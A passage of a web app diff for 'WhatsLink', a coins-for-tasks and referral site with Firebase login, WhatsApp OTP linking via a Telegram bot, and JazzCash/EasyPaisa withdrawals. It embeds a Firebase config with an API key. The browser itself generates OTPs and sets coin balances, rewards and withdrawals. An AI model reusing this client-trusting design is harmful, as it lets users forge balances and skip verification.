+                <div class="lbl" style="font-size:clamp(8px,1.2vw,10px);color:var(--text-mute);">Referrals</div>
+            </div>
+            <div class="stat-item" style="background:var(--glass-bg);border-radius:var(--radius-sm);padding:clamp(10px,1.8vw,14px);text-align:center;border:1px solid var(--glass-border);">
+                <div class="num" style="font-size:clamp(18px,3vw,24px);font-weight:800;color:var(--whatsapp);" id="refCoins">0</div>
+                <div class="lbl" style="font-size:clamp(8px,1.2vw,10px);color:var(--text-mute);">Coins</div>
+            </div>
+            <div class="stat-item" style="background:var(--glass-bg);border-radius:var(--radius-sm);padding:clamp(10px,1.8vw,14px);text-align:center;border:1px solid var(--glass-border);">
+                <div class="num" style="font-size:clamp(18px,3vw,24px);font-weight:800;color:var(--whatsapp);" id="refRank">#--</div>
+                <div class="lbl" style="font-size:clamp(8px,1.2vw,10px);color:var(--text-mute);">Rank</div>
+            </div>
+        </div>
+
+        <div class="glass-card">
+            <div style="font-weight:600;font-size:clamp(13px,1.8vw,14px);margin-bottom:8px;">Your Referral Link</div>
+            <div class="ref-link-box">
+                <input type="text" id="referralLinkInput" readonly value="Loading...">
+                <button class="btn btn-primary btn-sm" onclick="copyReferralLink()" style="padding:4px 12px;"><i class="fas fa-copy"></i></button>
+            </div>
+            <div class="share-icons">
+                <button class="share-btn whatsapp" onclick="shareWA()"><i class="fab fa-whatsapp"></i></button>
+                <button class="share-btn facebook" onclick="shareFB()"><i class="fab fa-facebook-f"></i></button>
+                <button class="share-btn twitter" onclick="shareTW()"><i class="fab fa-twitter"></i></button>
+                <button class="share-btn copy" onclick="copyReferralLink()"><i class="fas fa-link"></i></button>
+            </div>
+        </div>
+
+        <div class="glass-card">
+            <h4 style="font-size:clamp(13px,1.8vw,14px);font-weight:700;margin-bottom:8px;">📌 How to Share</h4>
+            <ul style="list-style:none;padding:0;font-size:clamp(11px,1.6vw,12px);color:var(--text-mute);line-height:2.2;">
+                <li><i class="fas fa-check-circle" style="color:var(--whatsapp);"></i> Copy your unique link</li>
+                <li><i class="fas fa-check-circle" style="color:var(--whatsapp);"></i> Share on WhatsApp, Facebook, or Twitter</li>
+                <li><i class="fas fa-check-circle" style="color:var(--whatsapp);"></i> Friend registers using your link</li>
+                <li><i class="fas fa-check-circle" style="color:var(--whatsapp);"></i> You get <strong>500 coins</strong> instantly!</li>
+            </ul>
+        </div>
+
+        <div class="glass-card">
+            <h4 style="font-size:clamp(13px,1.8vw,14px);font-weight:700;margin-bottom:8px;">🏆 Top Referrers</h4>
+            <div id="leaderboardList"><div style="font-size:clamp(11px,1.6vw,12px);color:var(--text-mute);text-align:center;padding:10px 0;">Loading...</div></div>
+        </div>
+    </div>
+
+    <!-- ===== TASKS ===== -->
+    <div class="page" id="page-tasks">
+        <div style="padding-top:6px;">
+            <h2 style="font-size:clamp(18px,3vw,22px);font-weight:800;">📋 Tasks</h2>
+            <p style="font-size:clamp(12px,1.6vw,13px);color:var(--text-mute);">Complete tasks & earn coins</p>
+        </div>
+        <div style="display:flex;gap:4px;flex-wrap:wrap;margin:8px 0 10px;">
+            <button class="btn btn-sm btn-primary active-filter" data-cat="all" style="padding:4px 10px;font-size:clamp(9px,1.4vw,11px);">All</button>
+            <button class="btn btn-sm btn-outline" data-cat="whatsapp" style="padding:4px 10px;font-size:clamp(9px,1.4vw,11px);">WhatsApp</button>
+            <button class="btn btn-sm btn-outline" data-cat="share" style="padding:4px 10px;font-size:clamp(9px,1.4vw,11px);">Share</button>
+            <button class="btn btn-sm btn-outline" data-cat="daily" style="padding:4px 10px;font-size:clamp(9px,1.4vw,11px);">Daily</button>
+            <button class="btn btn-sm btn-outline" data-cat="referral" style="padding:4px 10px;font-size:clamp(9px,1.4vw,11px);">Referral</button>
+        </div>
+        <div id="tasksList"></div>
+    </div>
+
+    <!-- ===== HELP ===== -->
+    <div class="page" id="page-help">
+        <div style="padding-top:6px;">
+            <h2 style="font-size:clamp(18px,3vw,22px);font-weight:800;">❓ Help</h2>
+            <p style="font-size:clamp(12px,1.6vw,13px);color:var(--text-mute);">Frequently asked questions</p>
+        </div>
+        <div class="glass-card" style="margin-top:8px;">
+            <div class="faq-item open">
+                <div class="faq-q" onclick="toggleFaq(this)"><span>How to link WhatsApp?</span><i class="fas fa-plus"></i></div>
+                <div class="faq-a">Go to Home → Click "Link WhatsApp Now" → Enter number → Get OTP → Verify.</div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-q" onclick="toggleFaq(this)"><span>Where will I get OTP?</span><i class="fas fa-plus"></i></div>
+                <div class="faq-a">OTP will be sent to your Telegram bot. Check your Telegram messages.</div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-q" onclick="toggleFaq(this)"><span>How to earn coins?</span><i class="fas fa-plus"></i></div>
+                <div class="faq-a">Complete tasks from the Tasks page. Each task gives coins.</div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-q" onclick="toggleFaq(this)"><span>How to withdraw?</span><i class="fas fa-plus"></i></div>
+                <div class="faq-a">Go to Profile → Withdraw. Minimum 1000 coins (500 PKR).</div>
+            </div>
+        </div>
+        <div class="glass-card">
+            <h4 style="font-size:clamp(13px,1.8vw,14px);font-weight:700;margin-bottom:8px;">📧 Contact Support</h4>
+            <form id="supportForm" onsubmit="sendSupport(event)">
+                <div style="margin-bottom:8px;"><input type="text" placeholder="Your Name" style="width:100%;padding:clamp(8px,1.4vw,10px) clamp(10px,1.8vw,12px);border:1px solid var(--glass-border);border-radius:var(--radius-sm);font-size:clamp(11px,1.6vw,12px);background:rgba(255,255,255,0.5);" required></div>
+                <div style="margin-bottom:8px;"><input type="email" placeholder="Your Email" style="width:100%;padding:clamp(8px,1.4vw,10px) clamp(10px,1.8vw,12px);border:1px solid var(--glass-border);border-radius:var(--radius-sm);font-size:clamp(11px,1.6vw,12px);background:rgba(255,255,255,0.5);" required></div>
+                <div style="margin-bottom:8px;"><textarea placeholder="Your Message" rows="3" style="width:100%;padding:clamp(8px,1.4vw,10px) clamp(10px,1.8vw,12px);border:1px solid var(--glass-border);border-radius:var(--radius-sm);font-size:clamp(11px,1.6vw,12px);background:rgba(255,255,255,0.5);resize:vertical;" required></textarea></div>
+                <button type="submit" class="btn btn-primary btn-block">Send Message</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- ===== PROFILE ===== -->
+    <div class="page" id="page-profile">
+        <div style="padding-top:6px;">
+            <h2 style="font-size:clamp(18px,3vw,22px);font-weight:800;">👤 My Profile</h2>
+            <p style="font-size:clamp(12px,1.6vw,13px);color:var(--text-mute);">Manage your account</p>
+        </div>
+
+        <div class="glass-card" style="margin-top:8px;">
+            <div class="profile-header">
+                <div class="profile-avatar-large" id="profileAvatar">U</div>
+                <div class="profile-info">
+                    <h2 id="profileName">User Name</h2>
+                    <div class="uid"><i class="fas fa-id-card"></i> UID: <span id="profileUID">---</span></div>
+                    <div style="font-size:clamp(11px,1.4vw,12px);color:var(--text-mute);" id="profileEmail">user@email.com</div>
+                </div>
+            </div>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:clamp(6px,1.2vw,10px);margin-top:10px;">
+                <div style="background:var(--glass-bg);border-radius:var(--radius-sm);padding:clamp(10px,1.8vw,12px);text-align:center;border:1px solid var(--glass-border);">
+                    <div style="font-size:clamp(18px,3vw,22px);font-weight:800;color:var(--coin);" id="profileCoins">0</div>
+                    <div style="font-size:clamp(8px,1.2vw,10px);color:var(--text-mute);">Coins</div>
+                </div>
+                <div style="background:var(--glass-bg);border-radius:var(--radius-sm);padding:clamp(10px,1.8vw,12px);text-align:center;border:1px solid var(--glass-border);">
+                    <div style="font-size:clamp(18px,3vw,22px);font-weight:800;color:var(--whatsapp);" id="profileEarned">₨ 0</div>
+                    <div style="font-size:clamp(8px,1.2vw,10px);color:var(--text-mute);">Earned</div>
+                </div>
+                <div style="background:var(--glass-bg);border-radius:var(--radius-sm);padding:clamp(10px,1.8vw,12px);text-align:center;border:1px solid var(--glass-border);">
+                    <div style="font-size:clamp(18px,3vw,22px);font-weight:800;color:var(--danger);" id="profileWithdrawn">₨ 0</div>
+                    <div style="font-size:clamp(8px,1.2vw,10px);color:var(--text-mute);">Withdrawn</div>
+                </div>
+                <div style="background:var(--glass-bg);border-radius:var(--radius-sm);padding:clamp(10px,1.8vw,12px);text-align:center;border:1px solid var(--glass-border);">
+                    <div style="font-size:clamp(18px,3vw,22px);font-weight:800;color:var(--primary);" id="profileRefs">0</div>
+                    <div style="font-size:clamp(8px,1.2vw,10px);color:var(--text-mute);">Referrals</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- WhatsApp Link Status -->
+        <div class="glass-card" style="border:2px solid var(--whatsapp);">
+            <div style="display:flex;align-items:center;justify-content:space-between;">
+                <div style="display:flex;align-items:center;gap:10px;">
+                    <i class="fab fa-whatsapp" style="font-size:clamp(20px,3vw,24px);color:var(--whatsapp);"></i>
+                    <div>
+                        <div style="font-weight:700;font-size:clamp(13px,1.8vw,14px);">WhatsApp Status</div>
+                        <span class="status-badge" id="waStatusBadge" style="display:inline-flex;align-items:center;gap:6px;padding:4px 14px;border-radius:50px;font-size:clamp(10px,1.4vw,12px);font-weight:600;background:#fde8e8;color:var(--danger);">❌ Not Linked</span>
+                    </div>
+                </div>
+                <button class="btn btn-primary btn-sm" onclick="openOTPPage()" id="waLinkBtn">Link Now</button>
+            </div>
+            <div id="waPhoneDisplay" style="font-size:clamp(11px,1.6vw,12px);color:var(--text-mute);margin-top:6px;display:none;">📱 <span id="waPhoneNumber">---</span></div>
+        </div>
+
+        <div class="glass-card">
+            <div class="profile-detail"><span class="label">Full Name</span><span class="value" id="pName">---</span></div>
+            <div class="profile-detail"><span class="label">Email</span><span class="value" id="pEmail">---</span></div>
+            <div class="profile-detail"><span class="label">WhatsApp</span><span class="value" id="pWA">Not Verified</span></div>
+            <div class="profile-detail"><span class="label">Referral Code</span><span class="value" id="pRefCode">---</span></div>
+            <div class="profile-detail"><span class="label">Joined</span><span class="value" id="pJoined">---</span></div>
+        </div>
+
+        <div class="withdraw-card">
+            <div style="display:flex;justify-content:space-between;align-items:center;">
+                <div>
+                    <div class="sub">Available Balance</div>
+                    <div class="amount" id="withdrawBalance">0</div>
+                    <div class="sub" style="font-size:clamp(10px,1.4vw,11px);">= ₨ <span id="withdrawPKR">0</span></div>
+                </div>
+                <span style="background:rgba(255,255,255,0.2);padding:4px 10px;border-radius:50px;font-size:clamp(9px,1.4vw,10px);font-weight:600;">1 coin = 0.5 PKR</span>
+            </div>
+            <form id="withdrawForm" onsubmit="requestWithdraw(event)" style="margin-top:12px;">
+                <div style="margin-bottom:8px;">
+                    <input type="number" id="wCoins" placeholder="Enter coins (min 1000)" min="1000" max="10000" required>
+                </div>
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px;">
+                    <select id="wMethod" required style="padding:clamp(8px,1.4vw,10px) clamp(10px,1.8vw,12px);border-radius:var(--radius-sm);border:none;background:rgba(255,255,255,0.15);color:white;font-size:clamp(11px,1.6vw,12px);">
+                        <option value="">Method</option>
+                        <option value="jazzcash">JazzCash</option>
+                        <option value="easypaisa">EasyPaisa</option>
+                    </select>
+                    <input type="text" id="wAccount" placeholder="Account Number" required>
+                </div>
+                <div style="font-size:clamp(9px,1.2vw,10px);opacity:0.7;margin-bottom:6px;">Min: 1000 coins (500 PKR) | Max: 10000 coins (5000 PKR)</div>
+                <button type="submit" class="btn btn-success btn-block" style="background:white;color:var(--primary);font-weight:700;padding:clamp(8px,1.6vw,12px);font-size:clamp(12px,1.8vw,13px);">
+                    <i class="fas fa-arrow-up"></i> Withdraw Coins
+                </button>
+            </form>
+        </div>
+
+        <div class="glass-card" style="margin-top:10px;">
+            <h4 style="font-size:clamp(13px,1.8vw,14px);font-weight:700;margin-bottom:8px;">📜 History</h4>
+            <div id="txHistory"><div style="font-size:clamp(11px,1.6vw,12px);color:var(--text-mute);text-align:center;padding:10px 0;">No transactions yet</div></div>
+        </div>
+
+        <button class="btn btn-outline btn-block" onclick="logoutUser()" style="margin-top:8px;border-color:var(--danger);color:var(--danger);padding:clamp(8px,1.6vw,12px);font-size:clamp(12px,1.8vw,13px);">
+            <i class="fas fa-sign-out-alt"></i> Logout
+        </button>
+    </div>
+
+</div>
+
+<!-- ===== AUTH OVERLAYS ===== -->
+<div class="auth-overlay" id="loginOverlay">
+    <div class="auth-card">
+        <div class="logo" style="justify-content:center;font-size:clamp(22px,3.5vw,26px);">
+            <i class="fab fa-whatsapp" style="color:var(--whatsapp);"></i>
+            <span style="color:var(--primary);">Whats</span><span style="color:var(--primary-dark);">Link</span>
+        </div>
+        <h2>Welcome Back</h2>
+        <p class="sub">Log in to your account</p>
+        <form id="loginForm" onsubmit="loginUser(event)">
+            <div class="field"><label>Email</label><input type="email" id="loginEmail" placeholder="you@email.com" required></div>
+            <div class="field"><label>Password</label><input type="password" id="loginPassword" placeholder="••••••••" required></div>
+            <div class="error-msg" id="loginError"></div>
+            <button type="submit" class="btn btn-primary btn-block">Login</button>
+        </form>
+        <div class="divider">or</div>
+        <button class="btn btn-outline btn-block" onclick="googleLogin()"><i class="fab fa-google"></i> Continue with Google</button>
+        <p class="switch-link">Don't have an account? <a onclick="showAuth('register')">Register</a></p>
+    </div>
+</div>
+
+<div class="auth-overlay" id="registerOverlay">
+    <div class="auth-card">
+        <div class="logo" style="justify-content:center;font-size:clamp(22px,3.5vw,26px);">
+            <i class="fab fa-whatsapp" style="color:var(--whatsapp);"></i>
+            <span style="color:var(--primary);">Whats</span><span style="color:var(--primary-dark);">Link</span>
+        </div>
+        <h2>Create Account</h2>
+        <p class="sub">Start earning money today</p>
+        <form id="registerForm" onsubmit="registerUser(event)">
+            <div class="field"><label>Full Name</label><input type="text" id="regName" placeholder="John Doe" required></div>
+            <div class="field"><label>Email</label><input type="email" id="regEmail" placeholder="you@email.com" required></div>
+            <div class="field"><label>Password</label><input type="password" id="regPassword" placeholder="Min 6 characters" minlength="6" required></div>
+            <div class="field"><label>Referral Code (Optional)</label><input type="text" id="regReferral" placeholder="Enter code"></div>
+            <div class="error-msg" id="registerError"></div>
+            <button type="submit" class="btn btn-primary btn-block">Create Account</button>
+        </form>
+        <div class="divider">or</div>
+        <button class="btn btn-outline btn-block" onclick="googleLogin()"><i class="fab fa-google"></i> Continue with Google</button>
+        <p class="switch-link">Already have an account? <a onclick="showAuth('login')">Login</a></p>
+    </div>
+</div>
+
+
+<!-- ============================================================
+JAVASCRIPT - COMPLETE FIREBASE + TELEGRAM BOT INTEGRATION
+============================================================ -->
+<script>
+// ============================================================
+// 🔥 FIREBASE CONFIG (Aap ki config)
+// ============================================================
+const firebaseConfig = {
+  apiKey: "AIzaSyDTwv-HIFYFK0Mqzyc6R-v_lWaOJBkvcs4",
+  authDomain: "whatslink-74835.firebaseapp.com",
+  databaseURL: "https://whatslink-74835-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "whatslink-74835",
+  storageBucket: "whatslink-74835.firebasestorage.app",
+  messagingSenderId: "1086959374289",
+  appId: "1:1086959374289:web:bdeca38de26f8272279af0",
+  measurementId: "G-C8NZ9B85DQ"
+};
+
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+const auth = firebase.auth();
+const db = firebase.firestore();
+const rtdb = firebase.database();
+
+console.log('🔥 Firebase Connected!');
+console.log('📱 Project:', firebaseConfig.projectId);
+
+// ============================================================
+// DATABASE FUNCTIONS (Firebase + Local Fallback)
+// ============================================================
+const DB = {
+    getCurrentUser() {
+        const user = auth.currentUser;
+        if (!user) return null;
+        return user;
+    },
+
+    async getUserData(uid) {
+        try {
+            const doc = await db.collection('users').doc(uid).get();
+            if (doc.exists) return doc.data();
+            return null;
+        } catch(e) {
+            console.log('Firestore error:', e);
+            return null;
+        }
+    },
+
+    async saveUserData(uid, data) {
+        try {
+            await db.collection('users').doc(uid).set(data, { merge: true });
+            // Also save to Realtime DB for Telegram Bot
+            await rtdb.ref('users/' + uid).set(data);
+            return true;
+        } catch(e) {
+            console.log('Save error:', e);
+            return false;
+        }
+    },
+
+    async completeTask(uid, taskId, reward) {
+        try {
+            const userDoc = await db.collection('users').doc(uid).get();
+            const userData = userDoc.data();
+            
+            if (!userData) throw new Error('User not found');
+            if (!userData.whatsappVerified) throw new Error('Please link WhatsApp first!');
+
+            const today = new Date().toISOString().split('T')[0];
+            const tasksCompleted = userData.tasksCompleted || {};
+            
+            // Check if already done today
+            if (tasksCompleted[taskId] && tasksCompleted[taskId].includes(today)) {
+                throw new Error('Already completed today!');
+            }
+
+            // Add task
+            if (!tasksCompleted[taskId]) tasksCompleted[taskId] = [];
+            tasksCompleted[taskId].push(today);
+
+            // Update coins
+            const newCoins = (userData.coins || 0) + reward;
+            const newTotalEarned = (userData.totalEarned || 0) + reward;
+
+            await db.collection('users').doc(uid).update({
+                coins: newCoins,
+                totalEarned: newTotalEarned,
+                tasksCompleted: tasksCompleted,
+                lastTask: new Date().toISOString()
+            });
+
+            // Update Realtime DB for Telegram Bot
+            await rtdb.ref('users/' + uid).update({
+                coins: newCoins,
+                totalEarned: newTotalEarned,
+                tasksCompleted: tasksCompleted
+            });
+
+            // Send to Telegram Bot
+            await this.sendToTelegram('task_complete', {
+                uid: uid,
+                name: userData.name || 'User',
+                task: taskId,
+                reward: reward,
+                coins: newCoins
+            });
+
+            return { success: true, coins: newCoins, reward: reward };
+        } catch(e) {
+            throw new Error(e.message);
+        }
+    },
+
+    async sendToTelegram(event, data) {
+        try {
+            await rtdb.ref('telegram/events').push({
+                event: event,
+                data: data,
+                timestamp: new Date().toISOString()
+            });
+            console.log('📤 Sent to Telegram:', event);
+        } catch(e) {
+            console.log('Telegram send error:', e);
+        }
+    },
+
+    async linkWhatsApp(uid, phone) {
+        try {
+            const otp = Math.floor(100000 + Math.random() * 900000).toString();
+            const expiry = Date.now() + 300000;
+
+            await rtdb.ref('otp/' + phone).set({
+                otp: otp,
+                uid: uid,
+                createdAt: Date.now(),
+                expiresAt: expiry
+            });
+
+            // Send to Telegram Bot
+            await this.sendToTelegram('otp_request', {
+                uid: uid,
+                phone: phone,
+                otp: otp,
+                expiry: new Date(expiry).toISOString()
+            });
+
+            return { success: true, otp: otp };
+        } catch(e) {
+            throw new Error(e.message);
+        }
+    },
+
+    async verifyOTP(phone, otp, uid) {
+        try {
+            const snapshot = await rtdb.ref('otp/' + phone).once('value');
+            const data = snapshot.val();
+
+            if (!data) throw new Error('No OTP found');
+            if (data.uid !== uid) throw new Error('Invalid request');
+            if (Date.now() > data.expiresAt) throw new Error('OTP expired');
+            if (data.otp !== otp) throw new Error('Invalid OTP');
+
+            // OTP Verified - Link WhatsApp
+            await db.collection('users').doc(uid).update({
+                whatsappVerified: true,
+                whatsappPhone: phone,
+                whatsappLinked: true
+            });
+
+            await rtdb.ref('users/' + uid).update({
+                whatsappVerified: true,
+                whatsappPhone: phone,
+                whatsappLinked: true
+            });
+
+            // Send to Telegram Bot
+            const userDoc = await db.collection('users').doc(uid).get();
+            const userData = userDoc.data();
+            
+            await this.sendToTelegram('whatsapp_linked', {
+                uid: uid,
+                name: userData?.name || 'User',
+                email: userData?.email || '',
+                phone: phone,
+                coins: userData?.coins || 0
+            });
+
+            // Delete OTP
+            await rtdb.ref('otp/' + phone).remove();
+
+            return { success: true };
+        } catch(e) {
+            throw new Error(e.message);
+        }
+    },
+
+    async getStats() {
+        try {
+            const snapshot = await rtdb.ref('users').once('value');
+            const users = snapshot.val() || {};
+            const userList = Object.values(users);
+            const total = userList.length;
+            const linked = userList.filter(u => u.whatsappVerified).length;
+            const active = userList.filter(u => {
+                const last = new Date(u.lastLogin || 0);
+                return (Date.now() - last.getTime()) < 1000 * 60 * 60 * 24 * 7;
+            }).length;
+            return { total, linked, active };
+        } catch(e) {
+            return { total: 0, linked: 0, active: 0 };
+        }
+    },
+
+    async getLeaderboard(limit = 5) {
+        try {
+            const snapshot = await rtdb.ref('users').once('value');
+            const users = snapshot.val() || {};
+            const userList = Object.values(users)
+                .filter(u => u.referrals && u.referrals.length > 0)
+                .sort((a, b) => (b.referrals?.length || 0) - (a.referrals?.length || 0))
+                .slice(0, limit);
+            return userList;
+        } catch(e) {
+            return [];
+        }
+    },
+
+    async getWithdrawals(uid) {
+        try {
+            const snapshot = await rtdb.ref('withdrawals/' + uid).once('value');
+            const data = snapshot.val() || {};
+            return Object.values(data).sort((a, b) => new Date(b.date) - new Date(a.date));
+        } catch(e) {
+            return [];
+        }
+    },
+
+    async requestWithdrawal(uid, coins, method, account) {
+        try {
+            const userDoc = await db.collection('users').doc(uid).get();
+            const userData = userDoc.data();
+            
+            if (!userData) throw new Error('User not found');
+            if (coins < 1000) throw new Error('Minimum 1000 coins (500 PKR)');
+            if (coins > 10000) throw new Error('Maximum 10000 coins (5000 PKR)');
+            if (coins > (userData.coins || 0)) throw new Error('Insufficient coins');
+            if (!/^03\d{9}$/.test(account.replace(/\s/g, ''))) {
+                throw new Error('Enter valid 11-digit account number');
+            }
+
+            const amount = coins * 0.5;
+            
+            // Update user coins
+            await db.collection('users').doc(uid).update({
+                coins: (userData.coins || 0) - coins,
+                totalWithdrawn: (userData.totalWithdrawn || 0) + amount
+            });
+
+            await rtdb.ref('users/' + uid).update({
+                coins: (userData.coins || 0) - coins,
+                totalWithdrawn: (userData.totalWithdrawn || 0) + amount
+            });
+
+            // Save withdrawal
+            const withdrawalId = 'w_' + Date.now();
+            await rtdb.ref('withdrawals/' + uid + '/' + withdrawalId).set({
+                id: withdrawalId,
+                coins: coins,
+                amount: amount,
+                method: method,
+                account: account,
+                status: 'pending',
+                date: new Date().toISOString()
+            });
+
+            // Send to Telegram Bot
+            await this.sendToTelegram('withdrawal_request', {
+                uid: uid,
+                name: userData.name || 'User',
+                coins: coins,
+                amount: amount,
+                method: method,
+                account: account
+            });
+
+            return { success: true, amount: amount };
+        } catch(e) {
+            throw new Error(e.message);
+        }
+    }
+};
+
+// ============================================================
+// AUTH FUNCTIONS
+// ============================================================
+async function registerUser(e) {
+    e.preventDefault();
+    const errorEl = document.getElementById('registerError');
+    errorEl.style.display = 'none';
+
+    try {
+        const name = document.getElementById('regName').value.trim();
+        const email = document.getElementById('regEmail').value.trim();
+        const password = document.getElementById('regPassword').value;
+        const referral = document.getElementById('regReferral').value.trim() || null;
+
+        if (!name || !email || !password) throw new Error('All fields required');
+        if (password.length < 6) throw new Error('Password min 6 characters');
+
+        // Create user
+        const userCredential = await auth.createUserWithEmailAndPassword(email, password);
+        const user = userCredential.user;
+
+        // Save user data
+        const userData = {
+            uid: user.uid,
+            name: name,
+            email: email,
+            whatsappVerified: false,
+            whatsappPhone: '',
+            whatsappLinked: false,
+            coins: 200,
+            totalEarned: 200,
+            totalWithdrawn: 0,
+            referralCode: Math.random().toString(36).slice(2, 8).toUpperCase(),
+            referredBy: referral || '',
+            referrals: [],
+            tasksCompleted: {
+                welcome: [new Date().toISOString().split('T')[0]]
+            },
+            joinedDate: new Date().toISOString(),
+            lastLogin: new Date().toISOString()
+        };
+
+        await DB.saveUserData(user.uid, userData);
+
+        // Check referral
+        if (referral) {
+            const snapshot = await rtdb.ref('users').orderByChild('referralCode').equalTo(referral).once('value');
+            const referrerData = snapshot.val();
+            if (referrerData) {
+                const referrerUid = Object.keys(referrerData)[0];
+                await rtdb.ref('users/' + referrerUid + '/referrals').push(user.uid);
+                await rtdb.ref('users/' + referrerUid + '/coins').transaction((current) => (current || 0) + 500);
+                await rtdb.ref('users/' + referrerUid + '/totalEarned').transaction((current) => (current || 0) + 500);
+            }
+        }
+
+        hideAuth();
+        showToast('Welcome ' + name + '! 🎉', 'success');
+        navigate('home');
+        updateUI();
+
+    } catch(err) {
+        errorEl.textContent = err.message;
+        errorEl.style.display = 'block';
+    }
+}
+
+async function loginUser(e) {
+    e.preventDefault();
+    const errorEl = document.getElementById('loginError');
+    errorEl.style.display = 'none';
+
+    try {
+        const email = document.getElementById('loginEmail').value.trim();
+        const password = document.getElementById('loginPassword').value;
+
+        if (!email || !password) throw new Error('All fields required');
+
+        await auth.signInWithEmailAndPassword(email, password);
+        
+        // Update last login
+        const user = auth.currentUser;
+        if (user) {
+            await rtdb.ref('users/' + user.uid + '/lastLogin').set(new Date().toISOString());
+            await db.collection('users').doc(user.uid).update({
+                lastLogin: new Date().toISOString()
+            });
+        }
+
+        hideAuth();
+        showToast('Welcome back! 👋', 'success');
+        navigate('home');
+        updateUI();
+
+    } catch(err) {
+        errorEl.textContent = err.message;
+        errorEl.style.display = 'block';
+    }
+}
+
+async function googleLogin() {
+    try {
+        const provider = new firebase.auth.GoogleAuthProvider();
+        const userCredential = await auth.signInWithPopup(provider);
+        const user = userCredential.user;
+
+        // Check if user exists
+        const userData = await DB.getUserData(user.uid);
+        if (!userData) {
+            const newUser = {
+                uid: user.uid,
+                name: user.displayName || 'Google User',
+                email: user.email,
+                whatsappVerified: false,
+                whatsappPhone: '',
+                whatsappLinked: false,
+                coins: 200,
+                totalEarned: 200,
+                totalWithdrawn: 0,
+                referralCode: Math.random().toString(36).slice(2, 8).toUpperCase(),
+                referredBy: '',
+                referrals: [],
+                tasksCompleted: {
+                    welcome: [new Date().toISOString().split('T')[0]]
+                },
+                joinedDate: new Date().toISOString(),
+                lastLogin: new Date().toISOString()
+            };
+            await DB.saveUserData(user.uid, newUser);
+        }
+
+        hideAuth();
+        showToast('Welcome! 🎉', 'success');
+        navigate('home');
+        updateUI();
+
+    } catch(err) {
+        showToast(err.message, 'error');
+    }
+}
+
+async function logoutUser() {
+    await auth.signOut();
+    showToast('Logged out', 'success');
+    navigate('home');
+    updateUI();
+}
+
+// ============================================================
+// WHATSAPP OTP FUNCTIONS
+// ============================================================
+let currentPhone = '';
+let otpTimer = null;
+let timerSeconds = 60;
+
+async function openOTPPage() {
+    const user = auth.currentUser;
+    if (!user) { showToast('Please login first', 'error'); return; }
+    
+    const userData = await DB.getUserData(user.uid);
+    if (userData && userData.whatsappVerified) {
+        showToast('✅ WhatsApp already linked!', 'success');
+        return;
+    }
+    
+    navigate('otp');
+    resetOTPPage();
+}
+
+function resetOTPPage() {
+    document.getElementById('otpStep1').style.display = 'block';
+    document.getElementById('otpStep2').style.display = 'none';
+    document.getElementById('otpStep3').style.display = 'none';
+    document.getElementById('otpPhone').value = '';
+    document.getElementById('otpPhone').focus();
+    document.getElementById('sendOTPBtn').disabled = false;
+    document.getElementById('sendOTPBtn').innerHTML = '<i class="fas fa-paper-plane"></i> Get OTP';
+    document.getElementById('otpStatus').className = 'status-box';
+    document.getElementById('otpStatus').style.display = 'none';
+    clearInterval(otpTimer);
+}
+
+function goBackToPhone() {
+    document.getElementById('otpStep2').style.display = 'none';
+    document.getElementById('otpStep1').style.display = 'block';
+    document.getElementById('otpPhone').value = currentPhone || '';
+    document.getElementById('otpPhone').focus();
+    clearInterval(otpTimer);
+    document.getElementById('sendOTPBtn').disabled = false;
+    document.getElementById('sendOTPBtn').innerHTML = '<i class="fas fa-paper-plane"></i> Get OTP';
+}
+
+async function sendOTP() {
+    const phone = document.getElementById('otpPhone').value.trim();
+    const btn = document.getElementById('sendOTPBtn');
+    const user = auth.currentUser;
+
+    if (!user) { showToast('Please login first', 'error'); return; }
+
+    try {
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
+
+        const result = await DB.linkWhatsApp(user.uid, phone);
+        currentPhone = phone;
+
+        // Show OTP step
+        document.getElementById('otpStep1').style.display = 'none';
+        document.getElementById('otpStep2').style.display = 'block';
+        document.getElementById('otpPhoneDisplay').textContent = phone;
+
+        // Clear OTP inputs
+        document.querySelectorAll('.otp-digit').forEach(el => el.value = '');
+        document.querySelector('.otp-digit').focus();
+
+        // Start timer
+        startTimer();
+        showOTPStatus('📱 OTP sent! Check your Telegram bot.', 'info');
+        showToast('📱 OTP sent to your Telegram bot!', 'success');
+
+    } catch(err) {
+        showToast(err.message, 'error');
+    } finally {
+        btn.disabled = false;
+        btn.innerHTML = '<i class="fas fa-paper-plane"></i> Get OTP';
+    }
+}
+
+function startTimer() {
+    timerSeconds = 60;
+    document.getElementById('timerSeconds').textContent = timerSeconds;
+    document.getElementById('resendLink').style.opacity = '0.5';
+    document.getElementById('resendLink').style.pointerEvents = 'none';
+
+    clearInterval(otpTimer);
+    otpTimer = setInterval(() => {
+        timerSeconds--;
+        document.getElementById('timerSeconds').textContent = timerSeconds;
+        if (timerSeconds <= 0) {
+            clearInterval(otpTimer);
+            document.getElementById('resendLink').style.opacity = '1';
+            document.getElementById('resendLink').style.pointerEvents = 'auto';
+            showOTPStatus('⏰ OTP expired. Request a new one.', 'error');
+        }
+    }, 1000);
+}
+
+async function resendOTP() {
+    await sendOTP();
+}
+
+async function verifyOTP() {
+    const inputs = document.querySelectorAll('.otp-digit');
+    const otp = Array.from(inputs).map(el => el.value).join('');
+    const user = auth.currentUser;
+
+    if (!user) { showToast('Please login first', 'error'); return; }
+    if (otp.length !== 6) { showOTPStatus('Please enter complete 6-digit OTP', 'error'); return; }
+
+    try {
+        const result = await DB.verifyOTP(currentPhone, otp, user.uid);
+
+        // Success
+        document.getElementById('otpStep2').style.display = 'none';
+        document.getElementById('otpStep3').style.display = 'block';
+        document.getElementById('successPhone').textContent = currentPhone;
+
+        showToast('✅ WhatsApp linked successfully! +500 coins earned!', 'success');
+        updateUI();
+
+        setTimeout(() => navigate('tasks'), 2000);
+
+    } catch(err) {
+        showOTPStatus(err.message, 'error');
+    }
+}
+
+function showOTPStatus(message, type = 'info') {
+    const status = document.getElementById('otpStatus');
+    status.textContent = message;
+    status.className = 'status-box ' + type;
+    status.style.display = 'block';
+}
+
+// OTP Auto-move
+document.addEventListener('DOMContentLoaded', function() {
